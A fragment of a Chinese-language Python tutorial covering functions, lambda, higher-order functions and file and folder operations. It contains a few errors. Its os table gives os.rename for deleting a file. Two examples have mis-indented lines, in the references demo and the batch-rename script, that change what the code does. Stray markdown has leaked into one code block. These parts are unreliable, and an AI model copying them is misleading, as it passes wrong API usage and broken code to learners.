<li>help(func)</li>
</ul>
</li>
</ul>
<h2 id="13-2-变量作用域"><a href="#13-2-变量作用域" class="headerlink" title="13.2 变量作用域"></a>13.2 变量作用域</h2><ul>
<li>局部变量<ul>
<li>定义在函数体内部的变量，只在函数体内部⽣效。</li>
</ul>
</li>
<li>全局变量<ul>
<li>定义在函数体内、外都能⽣效的变量。</li>
</ul>
</li>
</ul>
<h2 id="13-3-函数的返回值"><a href="#13-3-函数的返回值" class="headerlink" title="13.3 函数的返回值"></a>13.3 函数的返回值</h2><ul>
<li>返回多个返回值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_num</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = return_num()</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># (1, 2)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-4-函数参数"><a href="#13-4-函数参数" class="headerlink" title="13.4 函数参数"></a>13.4 函数参数</h2><ul>
<li>位置参数<ul>
<li>根据函数定义的位置来传递参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;男&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>关键字参数<ul>
<li>通过“键=值”形式加以指定，可以让函数更加清晰、容易使⽤，同时也清除了参数的顺序需<br>求。</li>
<li>函数调⽤时，如果有位置参数时，<strong>位置参数必须在关键字参数的前⾯</strong>，但<strong>关键字参数之间不存在<br>先后顺序</strong>。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;Rose&#x27;</span>, age=<span class="number">20</span>, gender=<span class="string">&#x27;⼥&#x27;</span>)</span><br><span class="line">user_info(<span class="string">&#x27;⼩明&#x27;</span>, gender=<span class="string">&#x27;男&#x27;</span>, age=<span class="number">16</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>缺省参数<ul>
<li>缺省参数也叫默认参数，⽤于定义函数，为参数提供默认值，调⽤函数时可不传该默认参数的值</li>
<li>所有位置参数必须出现在默认参数前，包括函数定义和调⽤<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">name, age, gender=<span class="string">&#x27;男&#x27;</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您的名字是<span class="subst">&#123;name&#125;</span>, 年龄是<span class="subst">&#123;age&#125;</span>, 性别是<span class="subst">&#123;gender&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">user_info(<span class="string">&#x27;Rose&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;⼥&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>不定⻓参数<ul>
<li>也叫可变参数。分为包裹(packing)位置参数，和包裹关键字参数。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 包裹位置传参</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>)  <span class="comment"># (&#x27;TOM&#x27;,)</span></span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>, <span class="number">18</span>)  <span class="comment"># (&#x27;TOM&#x27;, 18)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 包裹关键字传参</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">   </span><br><span class="line">user_info(name=<span class="string">&#x27;TOM&#x27;</span>, age=<span class="number">18</span>, <span class="built_in">id</span>=<span class="number">110</span>)  <span class="comment"># &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 18, &#x27;id&#x27;: 110&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="13-5-拆包"><a href="#13-5-拆包" class="headerlink" title="13.5 拆包"></a>13.5 拆包</h2><ul>
<li>元组(tuple)拆包<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_num</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line">num1, num2 = return_num()</span><br><span class="line"><span class="built_in">print</span>(num1)  <span class="comment"># 100</span></span><br><span class="line"><span class="built_in">print</span>(num2)  <span class="comment"># 200</span></span><br></pre></td></tr></table></figure></li>
<li>字典(dict)拆包<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;TOM&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br><span class="line">a, b = dict1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进⾏拆包，取出来的是字典的key</span></span><br><span class="line"><span class="built_in">print</span>(a)  <span class="comment"># name</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment"># age</span></span><br><span class="line"><span class="built_in">print</span>(dict1[a])  <span class="comment"># TOM</span></span><br><span class="line"><span class="built_in">print</span>(dict1[b])  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-6-引用"><a href="#13-6-引用" class="headerlink" title="13.6 引用"></a>13.6 引用</h2><p>在python中，值是靠引⽤来传递来的。可以⽤ id() 来判断两个变量是否为同⼀个值的引⽤。</p>
<ul>
<li>引⽤当做实参<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line">a += a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># int：计算前后id值不同</span></span><br><span class="line">b = <span class="number">100</span></span><br><span class="line">test1(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表：计算前后id值相同</span></span><br><span class="line">c = [<span class="number">11</span>, <span class="number">22</span>]</span><br><span class="line">test1(c)</span><br></pre></td></tr></table></figure>
<h2 id="13-7-可变和不可变类型"><a href="#13-7-可变和不可变类型" class="headerlink" title="13.7 可变和不可变类型"></a>13.7 可变和不可变类型</h2>所谓可变类型与不可变类型是指：数据能够直接进⾏修改，如果能直接修改那么就是可变，否则是不可变.</li>
<li>可变类型<ul>
<li>列表</li>
<li>字典</li>
<li>集合</li>
</ul>
</li>
<li>不可变类型<ul>
<li>整型</li>
<li>浮点型</li>
<li>字符串</li>
<li>元组</li>
</ul>
</li>
</ul>
<h2 id="13-8-lambda-表达式"><a href="#13-8-lambda-表达式" class="headerlink" title="13.8 lambda 表达式"></a>13.8 lambda 表达式</h2><p>如果⼀个函数有⼀个返回值，并且只有⼀句代码，可以使⽤ lambda简化。</p>
<h3 id="13-8-1-语法"><a href="#13-8-1-语法" class="headerlink" title="13.8.1 语法"></a>13.8.1 语法</h3><p>lambda 参数列表 ： 表达式</p>
<ul>
<li>lambda表达式的参数可有可⽆，函数的参数在lambda表达式中完全适⽤。</li>
<li>lambda表达式能接收任何数量的参数但只能返回⼀个表达式的值。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(fn1)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(fn1())  <span class="comment"># 200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda表达式</span></span><br><span class="line">fn2 = <span class="keyword">lambda</span>: <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(fn2)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(fn2())  <span class="comment"># 100</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="13-8-2-参数形式"><a href="#13-8-2-参数形式" class="headerlink" title="13.8.2 参数形式"></a>13.8.2 参数形式</h3><ul>
<li>无参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span>: <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(fn1())  <span class="comment"># 100</span></span><br></pre></td></tr></table></figure></li>
<li>一个参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> a: a</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="string">&#x27;hello world&#x27;</span>))  <span class="comment"># hello world</span></span><br></pre></td></tr></table></figure></li>
<li>默认参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> a, b, c=<span class="number">100</span>: a + b + c</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="number">10</span>, <span class="number">20</span>))  <span class="comment"># 130 : 10+20+100</span></span><br></pre></td></tr></table></figure></li>
<li>可变参数：*args<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fn1 = <span class="keyword">lambda</span> *args: args</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>))  <span class="comment"># (10,20,30) 元组</span></span><br></pre></td></tr></table></figure></li>
<li>可变参数：**kwargs<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  fn1 = <span class="keyword">lambda</span> **kwargs: kwargs</span><br><span class="line">  <span class="built_in">print</span>(fn1(name=<span class="string">&#x27;python&#x27;</span>, age=<span class="number">20</span>))  <span class="comment"># &#123;&#x27;name&#x27;: &#x27;python&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br><span class="line">  ```  </span><br><span class="line"><span class="comment">### 13.8.3 应用</span></span><br><span class="line">- 带判断的<span class="keyword">lambda</span></span><br><span class="line">  ```python</span><br><span class="line">  fn1 = <span class="keyword">lambda</span> a, b: a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br><span class="line">  <span class="built_in">print</span>(fn1(<span class="number">1000</span>, <span class="number">500</span>))</span><br></pre></td></tr></table></figure></li>
<li>列表数据按字典key的值排序<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">students = [</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;TOM&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;ROSE&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Jack&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span>&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 按name值升序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;, &#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按name值降序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;name&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;, &#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按age值升序排列</span></span><br><span class="line">students.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;age&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(students)  <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;, &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;, &#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;age&#x27;: 22&#125;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="13-9-内置高阶函数"><a href="#13-9-内置高阶函数" class="headerlink" title="13.9 内置高阶函数"></a>13.9 内置高阶函数</h2><ul>
<li>map()<ul>
<li>map(func, lst)，将传⼊的函数变量func作⽤到lst变量的每个元素中，并将结果组成新的列表(Python2)/迭代器(Python3)返回。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">map</span>(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># &lt;map object at 0x0000013769653198&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result)) <span class="comment"># [1, 4, 9, 16, 25]</span></span><br><span class="line"><span class="comment"># 注意 result 经过 list 类型转换后，result 变为空</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>reduce()<ul>
<li>reduce(func，lst)，其中func必须有两个参数。每次func计算的结果继续和序列的下⼀个元素做累积计算。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a, b</span>):</span>  <span class="comment"># 上一次函数执行的结果会当作参数传递到下一次的函数（参数 a）</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">result = functools.reduce(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 15</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>filter()<ul>
<li>filter(func, lst)函数⽤于过滤序列, 过滤掉不符合条件的元素, 返回⼀个 filter 对象。如果要转换为列表,可以使⽤ list() 来转换。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">filter</span>(func, list1)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 内存地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))  <span class="comment"># [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="14-文件操作"><a href="#14-文件操作" class="headerlink" title="14. 文件操作"></a>14. 文件操作</h1><h2 id="14-1-打开模式"><a href="#14-1-打开模式" class="headerlink" title="14.1 打开模式"></a>14.1 打开模式</h2><p>在python，使⽤open函数，可以打开⼀个已经存在的⽂件，或者创建⼀个新⽂件，语法如下：</p>
<blockquote>
<p>open(name, mode)</p>
<ul>
<li>name：是要打开的⽬标⽂件名的字符串(可以包含⽂件所在的具体路径)。</li>
<li>mode：设置打开⽂件的模式(访问模式)：只读、写⼊、追加等。</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>以只读⽅式打开⽂件。⽂件的指针将会放在⽂件的开头。这是默认模式。</td>
</tr>
<tr>
<td>rb</td>
<td>以⼆进制格式打开⼀个⽂件⽤于只读。⽂件指针将会放在⽂件的开头。这是默认模式。</td>
</tr>
<tr>
<td>r+</td>
<td>打开⼀个⽂件⽤于读写。⽂件指针将会放在⽂件的开头。</td>
</tr>
<tr>
<td>rb+</td>
<td>以⼆进制格式打开⼀个⽂件⽤于读写。⽂件指针将会放在⽂件的开头。</td>
</tr>
<tr>
<td>w</td>
<td>打开⼀个⽂件只⽤于写⼊。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>wb</td>
<td>以⼆进制格式打开⼀个⽂件只⽤于写⼊。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>w+</td>
<td>打开⼀个⽂件⽤于读写。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>wb+</td>
<td>以⼆进制格式打开⼀个⽂件⽤于读写。如果该⽂件已存在则打开⽂件，并从开头开始编辑，即原有内容会被删除。如果该⽂件不存在，创建新⽂件。</td>
</tr>
<tr>
<td>a</td>
<td>打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。也就是说，新的内容将会被写⼊到已有内容之后。如果该⽂件不存在，创建新⽂件进⾏写⼊。</td>
</tr>
<tr>
<td>ab</td>
<td>以⼆进制格式打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。也就是说，新的内容将会被写⼊到已有内容之后。如果该⽂件不存在，创建新⽂件进⾏写⼊。</td>
</tr>
<tr>
<td>a+</td>
<td>打开⼀个⽂件⽤于读写。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。⽂件打开时会是追加模式。如果该⽂件不存在，创建新⽂件⽤于读写。ab+ 以⼆进制格式打开⼀个⽂件⽤于追加。如果该⽂件已存在，⽂件指针将会放在⽂件的结尾。如果该⽂件不存在，创建新⽂件⽤于读写。</td>
</tr>
</tbody></table>
<h2 id="14-2-⽂件对象⽅法"><a href="#14-2-⽂件对象⽅法" class="headerlink" title="14.2 ⽂件对象⽅法"></a>14.2 ⽂件对象⽅法</h2><h3 id="14-2-1-写"><a href="#14-2-1-写" class="headerlink" title="14.2.1 写"></a>14.2.1 写</h3><blockquote>
<p>对象.write(‘内容’)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 打开⽂件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.⽂件写⼊</span></span><br><span class="line">f.write(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 关闭⽂件</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：</p>
<ol>
<li>w 和 a 模式：如果⽂件不存在则创建该⽂件；如果⽂件存在， w 模式先清空再写⼊， a 模式直接末尾追加。</li>
<li>r 模式：如果⽂件不存在则报错。</li>
</ol>
</blockquote>
<h3 id="14-2-2-读"><a href="#14-2-2-读" class="headerlink" title="14.2.2 读"></a>14.2.2 读</h3><ul>
<li>read()<ul>
<li>⽂件对象.read(num), num表示要从⽂件中读取的数据的⻓度（单位是字节），如果没有传⼊num，那么就表示读取⽂件中所有的数据。</li>
</ul>
</li>
<li>readlines()<ul>
<li>readlines可以按照⾏的⽅式把整个⽂件中的内容进⾏⼀次性读取，并且返回的是⼀个列表，其中每⼀⾏的数据为⼀个元素。  </li>
</ul>
</li>
<li>readline()<ul>
<li>⼀次读取⼀⾏内容。</li>
</ul>
</li>
<li>seek()<ul>
<li>⽂件对象.seek(偏移量, 起始位置)。⽤来移动⽂件指针。<ul>
<li>0：⽂件开头</li>
<li>1：当前位置</li>
<li>2：⽂件结尾</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="14-3-文件备份"><a href="#14-3-文件备份" class="headerlink" title="14.3 文件备份"></a>14.3 文件备份</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">old_name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您要备份的⽂件名：&#x27;</span>)</span><br><span class="line">index = old_name.rfind(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> index &gt; <span class="number">0</span>:</span><br><span class="line">    postfix = old_name[index:]</span><br><span class="line"></span><br><span class="line">new_name = old_name[:index] + <span class="string">&#x27;[备份]&#x27;</span> + postfix</span><br><span class="line"></span><br><span class="line">old_f = <span class="built_in">open</span>(old_name, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">new_f = <span class="built_in">open</span>(new_name, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con = old_f.read(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(con) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    new_f.write(con)</span><br><span class="line"></span><br><span class="line">old_f.close()</span><br><span class="line">new_f.close()</span><br></pre></td></tr></table></figure>

<h2 id="14-4-⽂件和⽂件夹的操作"><a href="#14-4-⽂件和⽂件夹的操作" class="headerlink" title="14.4 ⽂件和⽂件夹的操作"></a>14.4 ⽂件和⽂件夹的操作</h2><p>在Python中⽂件和⽂件夹的操作要借助os模块⾥⾯的相关功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>os.rename(⽬标⽂件名, 新⽂件名)</td>
<td>⽂件重命名</td>
</tr>
<tr>
<td>os.rename(⽬标⽂件名, 新⽂件名)</td>
<td>删除⽂件</td>
</tr>
<tr>
<td>os.mkdir(⽂件夹名字)</td>
<td>创建⽂件夹</td>
</tr>
<tr>
<td>os.rmdir(⽂件夹名字)</td>
<td>删除⽂件夹</td>
</tr>
<tr>
<td>os.getcwd()</td>
<td>获取当前⽬录</td>
</tr>
<tr>
<td>os.chdir(⽬录)</td>
<td>改变默认⽬录</td>
</tr>
<tr>
<td>os.listdir(⽬录)</td>
<td>获取⽬录列表</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 设置重命名标识：如果为1则添加指定字符，flag取值为2则删除指定字符</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定⽬录</span></span><br><span class="line">dir_name = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定⽬录的⽂件列表</span></span><br><span class="line">file_list = os.listdir(dir_name)</span><br><span class="line"><span class="comment"># print(file_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历⽂件列表内的⽂件</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> file_list:</span><br><span class="line">    <span class="comment"># 添加指定字符</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        new_name = <span class="string">&#x27;Python-&#x27;</span> + name</span><br><span class="line">    <span class="comment"># 删除指定字符</span></span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        num = <span class="built_in">len</span>(<span class="string">&#x27;Python-&#x27;</span>)</span><br><span class="line">        new_name = name[num:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印新⽂件名，测试程序正确性</span></span><br><span class="line"><span class="built_in">print</span>(new_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">os.rename(dir_name+name, dir_name+new_name)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
